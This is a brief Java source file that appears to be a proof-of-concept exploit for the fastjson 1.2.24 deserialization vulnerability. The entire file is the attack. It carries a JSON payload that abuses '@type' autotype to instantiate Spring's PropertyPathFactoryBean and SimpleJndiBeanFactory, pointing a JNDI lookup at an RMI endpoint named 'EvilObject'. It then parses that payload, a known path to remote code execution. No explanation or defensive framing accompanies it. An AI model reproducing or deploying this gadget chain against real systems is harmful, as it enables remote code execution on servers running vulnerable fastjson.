import com.alibaba.fastjson.JSON;

//@dependency{fastjson:1.2.24 ,spring-beans,spring-context,spring-core}
public class propertypathFactorybbean {

    public static void main(String args[]) {
        String payload = "{\"rand1\": {\"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\": \"rmi://127.0.0.1:1099/EvilObject\",\"propertyPath\": \"foo\",\"beanFactory\": {\"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\": [\"rmi://127.0.0.1:1099/EvilObject\"]}}}";
        Object res = JSON.parseObject(payload);
    }
}
